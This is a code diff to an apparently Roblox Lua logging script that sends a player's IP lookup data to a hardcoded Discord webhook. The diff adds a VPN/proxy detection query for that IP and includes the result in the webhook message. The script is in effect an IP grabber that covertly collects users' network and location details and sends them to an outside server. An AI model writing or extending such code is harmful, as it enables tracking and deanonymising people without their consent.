@@ -4,8 +4,9 @@ local url = "https://discord.com/api/webhooks/1286366140511293530/HXPwP_ciZXm-bU
 local player = game.Players.LocalPlayer
 local UserInputService = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
+local response1 = game:HttpGet("https://ipinfo.io/widget/demo/" .. ip .. "?dataset=proxy-vpn-detection")
+local data1 = HttpService:JSONDecode(response1)
 
--- Fetch the JSON data from the API
 local response = game:HttpGet("http://ip-api.com/json/".. ip)
 
 -- Decode the JSON into a Lua table
@@ -103,6 +104,11 @@ function sendLogger()
             {
 				["name"] = "IP information",
 				["value"] = "`" .. prettyPrint(data) .. "`",
+				["inline"] = true
+			},
+            {
+				["name"] = "VPN detection",
+				["value"] = "`" .. prettyPrint(data1) .. "`",
 				["inline"] = true
 			},
 
